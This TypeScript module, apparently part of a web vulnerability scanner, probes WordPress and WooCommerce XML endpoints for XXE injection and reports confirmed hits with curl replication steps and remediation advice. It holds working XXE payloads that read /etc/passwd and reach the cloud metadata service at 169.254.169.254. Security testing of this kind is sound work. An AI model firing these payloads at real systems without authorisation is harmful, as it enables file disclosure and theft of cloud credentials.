import type { Finding, ModuleResult, ScanState } from '../types.js';
import { fetchURL, finding, moduleResult, normalizeTarget, parallelProbe} from '../utils.js';

const MODULE_NAME = 'XXE Injection';

const XXE_FILE =
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' +
  '<foo>&xxe;</foo>';

const XXE_SSRF =
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ' +
  '"http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>';

const FILE_INDICATORS = ['root:', 'nobody:', 'daemon:', '/bin/bash', '/bin/sh'];
const SSRF_INDICATORS = ['ami-id', 'instance-id', 'local-ipv4', '169.254'];

const ENDPOINTS: [string, string][] = [
  [`/xmlrpc.php`,                    'text/xml'],
  [`/wp-admin/admin-ajax.php`,       'application/xml'],
  [`/?wc-api=v3/products`,           'application/xml'],
];

const PAYLOADS: [string, string, string[]][] = [
  ['file_read',      XXE_FILE, FILE_INDICATORS],
  ['ssrf_metadata',  XXE_SSRF, SSRF_INDICATORS],
];

export async function run(target: string, _state?: ScanState): Promise<ModuleResult> {
  const start = Date.now();
  target = normalizeTarget(target);
  const findings: Finding[] = [];
  const errors: string[] = [];

  try {
    await parallelProbe(ENDPOINTS, async ([path, contentType]) => {
      const url = target + path;
      for (const [payloadName, payloadBody, indicators] of PAYLOADS) {
        try {
          const res = await fetchURL(url, {
            method: 'POST',
            body: payloadBody,
            headers: { 'Content-Type': contentType },
            timeoutMs: 10000,
          });

          if (!res) continue;
          let body = '';
          try { body = await res.text(); } catch { continue; }

          const hitIndicator = indicators.find((i) => body.includes(i)) ?? null;

          // Require actual content evidence — timing anomalies alone are unreliable over the internet
          if (hitIndicator) {
            const evidenceNote = `Indicator '${hitIndicator}' found in response.`;
            findings.push(finding(
              'xxe_injection', 'CRITICAL', url,
              `XXE injection confirmed via ${payloadName} payload at ${url}. ${evidenceNote}`,
              {
                replication_steps: [
                  `# ${payloadName} payload`,
                  `curl -s -X POST "${url}" \\`,
                  `  -H "Content-Type: ${contentType}" \\`,
                  `  -d '${payloadBody}'`,
                  '# Look for: ' + indicators.slice(0, 3).join(', '),
                ],
                remediation:
                  'Disable external entity processing in all XML parsers. ' +
                  'Use libxml_disable_entity_loader(true) in PHP. ' +
                  'Validate and sanitize all XML input.',
                evidence: evidenceNote,
              },
            ));
          }
        } catch { /* request failed, continue */ }
      }
    });
  } catch (e) {
    errors.push(String(e));
  }

  return moduleResult(MODULE_NAME, target, findings, errors, start);
}
